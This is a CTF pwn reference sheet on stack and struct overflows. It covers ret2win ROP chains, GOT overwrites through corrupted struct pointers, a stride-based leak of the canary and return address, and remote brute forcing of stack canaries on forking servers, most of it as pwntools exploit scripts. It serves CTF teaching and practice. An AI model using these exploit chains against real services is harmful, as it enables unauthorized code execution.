# CTF Pwn - Overflow Basics

## Table of Contents
- [Stack Buffer Overflow](#stack-buffer-overflow)
  - [ret2win with Parameter (Magic Value Check)](#ret2win-with-parameter-magic-value-check)
  - [Stack Alignment (16-byte Requirement)](#stack-alignment-16-byte-requirement)
  - [Offset Calculation from Disassembly](#offset-calculation-from-disassembly)
  - [Input Filtering (memmem checks)](#input-filtering-memmem-checks)
  - [Finding Gadgets](#finding-gadgets)
  - [Hidden Gadgets in CMP Immediates](#hidden-gadgets-in-cmp-immediates)
- [Struct Pointer Overwrite (Heap Menu Challenges)](#struct-pointer-overwrite-heap-menu-challenges)
- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
- [Stack Canary Byte-by-Byte Brute Force on Forking Servers](#stack-canary-byte-by-byte-brute-force-on-forking-servers)
- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)

---

## Stack Buffer Overflow

1. Find offset to return address: `cyclic 200` then `cyclic -l <value>`
2. Check protections: `checksec --file=binary`
3. No PIE + No canary = direct ROP
4. Canary leak via format string or partial overwrite

### ret2win with Parameter (Magic Value Check)

**Pattern:** Win function checks argument against magic value before printing flag.

```c
// Common pattern in disassembly
void win(long arg) {
    if (arg == 0x1337c0decafebeef) {  // Magic check
        // Open and print flag
    }
}
```

**Exploitation (x86-64):**
```python
from pwn import *

# Find gadgets
pop_rdi_ret = 0x40150b   # pop rdi; ret
ret = 0x40101a           # ret (for stack alignment)
win_func = 0x4013ac
magic = 0x1337c0decafebeef

offset = 112 + 8  # = 120 bytes to reach return address

payload = b"A" * offset
payload += p64(ret)        # Stack alignment (Ubuntu/glibc requires 16-byte)
payload += p64(pop_rdi_ret)
payload += p64(magic)
payload += p64(win_func)
```

**Finding the win function:**
- Search for `fopen("flag.txt")` or similar in Ghidra
- Look for functions with no XREF that check a magic parameter
- Check for conditional print/exit patterns after parameter comparison

### Stack Alignment (16-byte Requirement)

Modern Ubuntu/glibc requires 16-byte stack alignment before `call` instructions. Symptoms of misalignment:
- SIGSEGV in `movaps` instruction (SSE requires alignment)
- Crash inside libc functions (printf, system, etc.)

**Fix:** Add extra `ret` gadget before your ROP chain:
```python
payload = b"A" * offset
payload += p64(ret)        # Align stack to 16 bytes
payload += p64(pop_rdi_ret)
# ... rest of chain
```

### Offset Calculation from Disassembly

```asm
push   %rbp
mov    %rsp,%rbp
sub    $0x70,%rsp        ; Stack frame = 0x70 (112) bytes
...
lea    -0x70(%rbp),%rax  ; Buffer at rbp-0x70
mov    $0xf0,%edx        ; read() size = 240 (overflow!)
```

**Calculate offset:**
- Buffer starts at `rbp - buffer_offset` (e.g., rbp-0x70)
- Saved RBP is at `rbp` (0 offset from buffer end)
- Return address is at `rbp + 8`
- **Total offset = buffer_offset + 8** = 112 + 8 = 120 bytes

### Input Filtering (memmem checks)

Some challenges filter input using `memmem()` to block certain strings:
```python
payload = b"A" * 120 + p64(gadget) + p64(value)
assert b"badge" not in payload and b"token" not in payload
```

### Finding Gadgets

```bash
# Find pop rdi; ret
objdump -d binary | grep -B1 "pop.*rdi"
ROPgadget --binary binary | grep "pop rdi"

# Find simple ret (for alignment)
objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
```

### Hidden Gadgets in CMP Immediates

CMP instructions with large immediates encode useful byte sequences. pwntools `ROP()` finds these automatically:

```asm
# Example: cmpl $0xc35e415f, -0x4(%rbp)
# Bytes: 81 7d fc 5f 41 5e c3
#                  ^^ ^^ ^^ ^^
# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
# At +4: 41 5e c3    = pop r14; ret
# At +5: 5e c3       = pop rsi; ret
```

**When to look:** Small binaries with few functions often lack standard gadgets. Check `cmp`, `mov`, and `test` instructions with large immediates -- their operand bytes may decode as useful gadgets.

```python
rop = ROP(elf)
# pwntools finds these automatically
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget)
```

## Struct Pointer Overwrite (Heap Menu Challenges)

**Pattern:** Menu-based programs with create/modify/delete/view operations on structs containing both data buffers and pointers. The modify/edit function reads more bytes than the data buffer, overflowing into adjacent pointer fields.

**Struct layout example:**
```c
struct Student {
    char name[36];      // offset 0x00 - data buffer
    int *grade_ptr;     // offset 0x24 - pointer to separate allocation
    float gpa;          // offset 0x28
};  // total: 0x2c (44 bytes)
```

**Exploitation:**
```python
from pwn import *

WIN = 0x08049316
GOT_TARGET = 0x0804c00c  # printf@GOT

# 1. Create object (allocates struct + sub-allocations)
create_student("AAAA", 5, 3.5)

# 2. Modify name - overflow into pointer field with GOT address
payload = b'A' * 36 + p32(GOT_TARGET)  # 36 bytes padding + GOT addr
modify_name(0, payload)

# 3. Modify grade - scanf("%d", corrupted_ptr) writes to GOT
modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry

# 4. Trigger overwritten function -> jumps to win
```

**GOT target selection strategy:**
- Identify which libc functions the `win` function calls internally
- Do NOT overwrite GOT entries for functions used by `win` (causes infinite recursion/crash)
- Prefer functions called in the main loop AFTER the write

| Win uses | Safe GOT targets |
|----------|-------------------|
| puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
| printf, system | puts, exit, free |
| system only | puts, printf, exit |

## Signed Integer Bypass (Negative Quantity)

`scanf("%d")` without sign check → negative input bypasses unsigned comparisons. See [advanced.md](advanced.md#signed-integer-bypass-negative-quantity) for full details.

## Canary-Aware Partial Overflow

**Pattern (MyGit, PascalCTF 2026):** Overflow `valid` flag (offset 32) without touching canary (offset 40). Use `./` as no-op path padding for precise length control. See [advanced.md](advanced.md) for full exploit chain.

## OOB Read via Stride/Rate Leak (DiceCTF 2026)

**Pattern (ByteCrusher):** A string processing function walks input buffer with configurable stride (`rate`). When rate exceeds buffer size, it skips over the null terminator and reads adjacent stack data (canary, return address).

**Stack layout:**
```
input_buf  [0-31]    <- user input (null at byte 31)
crushed    [32-63]   <- output buffer
canary     [72-79]   <- stack canary
saved rbp  [80-87]
return addr [88-95]  <- code pointer (defeats PIE)
```

**Vulnerable pattern:**
```c
void crush_string(char *input, char *output, int rate, int output_max_len) {
    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
        output[out_idx++] = input[i];  // rate > bufsize skips past null terminator
    }
}
```

**Exploitation:**
```python
from pwn import *

# Leak canary bytes 1-7 (byte 0 always 0x00)
canary = b'\x00'
for offset in range(73, 80):  # canary at offsets 72-79
    p.sendline(b'A' * 31)     # fill buffer (null at byte 31)
    p.sendline(str(offset).encode())  # rate = offset → reads input[0] then input[offset]
    p.sendline(b'2')           # output length = 2
    resp = p.recvline()
    canary += resp[1:2]        # second char is leaked byte

# Leak return address bytes 0-5 (top 2 always 0x00 in userspace)
ret_addr = b''
for offset in range(88, 94):
    p.sendline(b'A' * 31)
    p.sendline(str(offset).encode())
    p.sendline(b'2')
    resp = p.recvline()
    ret_addr += resp[1:2]

pie_base = u64(ret_addr.ljust(8, b'\x00')) - known_offset
admin_portal = pie_base + admin_offset

# Overflow gets() with leaked canary + computed address
payload = b'A' * 24 + canary + p64(0) + p64(admin_portal)
p.sendline(payload)
```

**When to use:** Any function that traverses a buffer with user-controlled step size and null-terminator-based stop condition.

**Key insight:** Stride-based OOB reads leak one byte per iteration by controlling which offset lands on the target byte. With enough iterations, leak full canary + return address to defeat both stack canary and PIE.

## Stack Canary Byte-by-Byte Brute Force on Forking Servers

**Pattern:** Server calls `fork()` for each connection. The child process inherits the same canary value. Brute-force the canary one byte at a time — each wrong byte crashes the child, but the parent continues with the same canary.

**Canary structure:** First byte is always `\x00` (prevents string function leaks). Remaining 7 bytes are random. Total: 8 bytes on x86-64, 4 on x86-32.

**Exploitation:**
```python
from pwn import *

OFFSET = 64  # bytes to canary (buffer size)
HOST, PORT = "target", 1337

def try_byte(known_canary, guess_byte):
    """Send overflow with known canary bytes + one guess. No crash = correct byte."""
    p = remote(HOST, PORT)
    payload = b'A' * OFFSET + known_canary + bytes([guess_byte])
    p.send(payload)
    try:
        resp = p.recv(timeout=1)
        p.close()
        return True   # No crash → byte is correct
    except:
        p.close()
        return False  # Crash → wrong byte

# Byte 0 is always \x00
canary = b'\x00'

# Brute-force bytes 1-7 (only 256 attempts per byte, 7*256 = 1792 total)
for byte_pos in range(1, 8):
    for guess in range(256):
        if try_byte(canary, guess):
            canary += bytes([guess])
            print(f"Canary byte {byte_pos}: 0x{guess:02x}")
            break
    else:
        print(f"Failed at byte {byte_pos}")
        break

print(f"Full canary: {canary.hex()}")

# Now overflow with correct canary + ROP chain
p = remote(HOST, PORT)
payload = b'A' * OFFSET + canary + b'B' * 8 + p64(win_addr)
p.sendline(payload)
```

**Prerequisites:**
- Server must `fork()` per connection (canary stays constant across children)
- Overflow must be controllable byte-by-byte (no all-at-once read)
- Distinguishable crash vs success response (timeout, error message, or connection behavior)

**Expected attempts:** 7 * 128 = 896 average (7 bytes * 128 average guesses per byte). Maximum 7 * 256 = 1792.

**Key insight:** `fork()` preserves the canary across child processes. Brute-forcing 8 bytes sequentially (7 * 256 = 1792 attempts) is vastly more efficient than brute-forcing all 8 bytes simultaneously (2^56 attempts).

---

## Global Buffer Overflow (CSV Injection)

**Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [advanced.md](advanced.md) for full exploit pattern.
